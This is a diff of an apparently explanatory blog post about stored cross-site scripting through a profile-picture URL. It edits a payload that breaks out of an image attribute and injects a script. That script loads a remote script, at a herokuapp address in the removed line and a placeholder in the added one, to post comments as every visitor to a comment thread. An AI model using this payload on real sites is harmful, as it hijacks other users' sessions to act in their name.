@@ -141,7 +141,7 @@ And “hello” would be alerted on every page load.
 
 To do a bit more than print “hello” on every page load, you could instead post a random comment (or a specific comment) to every comment thread you visit by setting your profile picture to the following:
 
-    http://some-domain.com/some-image.png"><script>var s = document.createElement('script'); s.addEventListener('load', comment); s.src = '[**<script to post comment>**'+new](https://localhost-test-fun.herokuapp.com/comment.js?'+new) Date(); document.body.appendChild(s); </script>
+    http://some-domain.com/some-image.png"><script>var s = document.createElement('script'); s.addEventListener('load', comment); s.src = '**<script to post comment>**'+new Date(); document.body.appendChild(s); </script>
 
 I’ll leave ***script to post comment*** as an exercise for the reader.
 
